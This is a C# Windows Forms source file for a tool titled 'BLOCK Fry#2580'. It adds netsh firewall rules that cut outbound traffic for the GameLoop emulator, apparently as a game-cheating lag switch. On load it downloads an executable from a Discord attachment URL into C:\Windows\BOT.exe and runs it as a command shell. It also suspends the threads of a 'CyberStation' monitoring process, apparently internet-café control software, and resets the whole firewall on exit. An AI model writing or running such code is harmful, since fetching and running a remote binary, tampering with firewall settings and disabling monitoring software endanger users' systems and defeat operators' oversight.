using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Button;

namespace Block
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);
        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool CloseHandle(IntPtr handle);


        private static void SuspendProcess(int pid)
        {
            var process = Process.GetProcessById(pid); // throws exception if process does not exist

            foreach (ProcessThread pT in process.Threads)
            {
                IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);

                if (pOpenThread == IntPtr.Zero)
                {
                    continue;
                }

                SuspendThread(pOpenThread);

                CloseHandle(pOpenThread);
            }
        }

        public static void ResumeProcess(int pid)
        {
            var process = Process.GetProcessById(pid);

            if (process.ProcessName == string.Empty)
                return;

            foreach (ProcessThread pT in process.Threads)
            {
                IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);

                if (pOpenThread == IntPtr.Zero)
                {
                    continue;
                }

                var suspendCount = 0;
                do
                {
                    suspendCount = ResumeThread(pOpenThread);
                } while (suspendCount > 0);

                CloseHandle(pOpenThread);
            }
        }

        string copyHere = @"C:\Windows\BOT.exe";
        int pid = 0;
        int _pidModUi = 0;
        private void dowloadFile()
        {
            if (!System.IO.Directory.Exists(copyHere))
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile("https://cdn.discordapp.com/attachments/815703837675094056/1036478524623704135/Fry.exe", copyHere);
                }
            }
        }

        private Random random = new Random();

        public string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        string ProcessExecutablePath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch
            {
                string query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

                foreach (ManagementObject item in searcher.Get())
                {
                    object id = item["ProcessID"];
                    object path = item["ExecutablePath"];

                    if (path != null && id.ToString() == process.Id.ToString())
                    {
                        return path.ToString();
                    }
                }
            }
            return "";
        }

        string _var1(int varrr)
        {
            if (varrr == 1)
            {
                return "Fry1";
            }
            if (varrr == 2)
            {
                return "Fry2";
            }
            if (varrr == 3)
            {
                return  "Fry3";
            }
            if (varrr == 4)
            {
                return "Fry4";
            }
            if (varrr == 5)
            {
                return "Fry5";
            }
            if (varrr == 6)
            {
                return  "Fry6";
            }
            if (varrr == 7)
            {
                return "Fry7";
            }
            if (varrr == 8)
            {
                return  "Fry8";
            }
            if (varrr == 9)
            {
                return "Fry9";
            }
            return "";
        }
        string start = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Tencent\\MobileGamePC\\UI", "InstallPath", "").ToString();
        string _pathofMOdui = "";
        private void Block()
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = copyHere,
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();
            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                {
                    if (checkBox2.Checked)
                    {
                        standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(1) + " protocol=TCP dir=out remoteport=01-79 action=block");
                        standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(2) + " protocol=TCP dir=out remoteport=81-442 action=block");
                        standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(3) + " protocol=TCP dir=out remoteport=444-65535 action=block");
                    }
                    if (!checkBox2.Checked)
                    {
                        if (_pathofMOdui.Length != 0)
                        {
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(7) + " protocol=TCP dir=out remoteport=01-79 action=block program=\"" + _pathofMOdui + "\"");
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(8) + " protocol=TCP dir=out remoteport=81-442 action=block program=\"" + _pathofMOdui + "\"");
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(9) + " protocol=TCP dir=out remoteport=444-65535 action=block program=\"" + _pathofMOdui + "\"");
                        }
                        else
                        {
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(4) + " protocol=TCP dir=out remoteport=01-79 action=block program=\"" + start + @"\AndroidEmulatorEx.exe" + "\"");
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(5) + " protocol=TCP dir=out remoteport=81-442 action=block program=\"" + start + @"\AndroidEmulatorEx.exe" + "\"");
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(6) + " protocol=TCP dir=out remoteport=444-65535 action=block program=\"" + start + @"\AndroidEmulatorEx.exe" + "\"");

                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(4) + " protocol=TCP dir=out remoteport=01-79 action=block program=\"" + start + @"\AndroidEmulatorEn.exe" + "\"");
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(5) + " protocol=TCP dir=out remoteport=81-442 action=block program=\"" + start + @"\AndroidEmulatorEn.exe" + "\"");
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(6) + " protocol=TCP dir=out remoteport=444-65535 action=block program=\"" + start + @"\AndroidEmulatorEn.exe" + "\"");

                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(4) + " protocol=TCP dir=out remoteport=01-79 action=block program=\"" + start + @"\AndroidEmulator.exe" + "\"");
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(5) + " protocol=TCP dir=out remoteport=81-442 action=block program=\"" + start + @"\AndroidEmulator.exe" + "\"");
                            standardInput.WriteLine("netsh advfirewall firewall add rule name=" + _var1(6) + " protocol=TCP dir=out remoteport=444-65535 action=block program=\"" + start + @"\AndroidEmulator.exe" + "\"");
                        }
                    }
                    standardInput.Flush();
                    standardInput.Close();
                    process.WaitForExit();
                }
            }
        }

        private void unBlock()
        {
            if (pid != 0)
            {
                SuspendProcess(pid);
            }
            string pathOrgGameLoop = start + "\\AndroidEmulatorEx.exe";
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = copyHere,
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();
            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                {
                    if (!checkBox2.Checked)
                    {
                        standardInput.WriteLine("netsh advfirewall firewall delete rule name=\"" + _var1(1)+"\"");
                        standardInput.WriteLine("netsh advfirewall firewall delete rule name=\"" + _var1(2)+"\"");
                        standardInput.WriteLine("netsh advfirewall firewall delete rule name=\"" + _var1(3)+"\"");
                    }
                    if (!checkBox1.Checked)
                    {
                        string rs = "netsh advfirewall firewall delete rule name=\"" + _var1(4) + "\"";
                        standardInput.WriteLine(rs);
                        standardInput.WriteLine("netsh advfirewall firewall delete rule name=\"" + _var1(5) + "\"");
                        standardInput.WriteLine("netsh advfirewall firewall delete rule name=\"" + _var1(6) + "\"");
                        standardInput.WriteLine("netsh advfirewall firewall delete rule name=\"" + _var1(7) + "\"");
                        standardInput.WriteLine("netsh advfirewall firewall delete rule name=\"" + _var1(8) + "\"");
                        standardInput.WriteLine("netsh advfirewall firewall delete rule name=\"" + _var1(9) + "\"");
                    }
                    standardInput.Flush();
                    standardInput.Close();
                    process.WaitForExit();
                }
               
            }
            if (pid != 0)
            {
                ResumeProcess(pid);
            }
        }

        private void unBlock2()
        {
            if (pid != 0)
            {
                SuspendProcess(pid);
            }
            string pathOrgGameLoop = start + "\\AndroidEmulatorEx.exe";
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = copyHere,
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();
            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                {                
                    standardInput.WriteLine("netsh advfirewall reset");
                    standardInput.Flush();
                    standardInput.Close();
                    process.WaitForExit();
                }

            }
            if (pid != 0)
            {
                ResumeProcess(pid);
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            this.Text = "BLOCK Fry#2580";
            Process[] pname = Process.GetProcessesByName("CyberStation");
            if (pname.Length == 0)
                pid = 0;
            else
                pid = Process.GetProcessesByName("CyberStation")[0].Id;

            Process[] _pname = Process.GetProcessesByName("AndroidEmulatorEx");
            if (_pname.Length == 0) { _pidModUi = 0;
                Process[] _pname1 = Process.GetProcessesByName("AndroidEmulatorEn");
                if(_pname1.Length == 0){
                    _pidModUi = 0;
                    Process[] _pname2 = Process.GetProcessesByName("AndroidEmulator");
                    if (_pname2.Length == 0)
                    {
                        _pidModUi = 0;
                    }
                    else
                    {
                        _pidModUi = Process.GetProcessesByName("AndroidEmulator")[0].Id;
                    }
                }
                else
                {
                    _pidModUi = Process.GetProcessesByName("AndroidEmulatorEn")[0].Id;
                }
            }

            else { _pidModUi = Process.GetProcessesByName("AndroidEmulatorEx")[0].Id; }

            dowloadFile();
            Process process = Process.GetProcessById(_pidModUi);
            _pathofMOdui = ProcessExecutablePath(process);
            MessageBox.Show(_pathofMOdui);
            checkBox1.Text = "Block Only GameLoop";
        }
        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                Thread t = new Thread(() => {
                    Block();
                });
                t.IsBackground = true;
                t.Start();
                checkBox1.Text = " BLOCK Only GameLoop ON ";
            }
            if (!checkBox1.Checked)
            {
                Thread t = new Thread(() => {
                    unBlock();
                });
                t.IsBackground = true;
                t.Start();
                checkBox1.Text = " BLOCK Only GameLoop OFF ";
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                Thread t = new Thread(() => {
                    Block();
                });
                t.IsBackground = true;
                t.Start();
                checkBox2.Text = " Block ALL MODE ON";
            }
            if (!checkBox2.Checked)
            {
                Thread t = new Thread(() => {
                    unBlock();
                });
                t.IsBackground = true;
                t.Start();
                checkBox2.Text = " Block ALL MODE OFF";
            }
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked)
            {
                if (pid != 0)
                {
                    checkBox3.Text = "Suspend CSM " + pid + " MODE";
                    SuspendProcess(pid);
                }
            }
            if (!checkBox3.Checked)
            {
                if (pid != 0)
                {
                    checkBox3.Text = "Resume CSM " + pid + " MODE";
                    ResumeProcess(pid);
                }
            }
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Thread t = new Thread(() => {
                unBlock2();
            });
            t.IsBackground = true;
            t.Start();
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }
    }
}
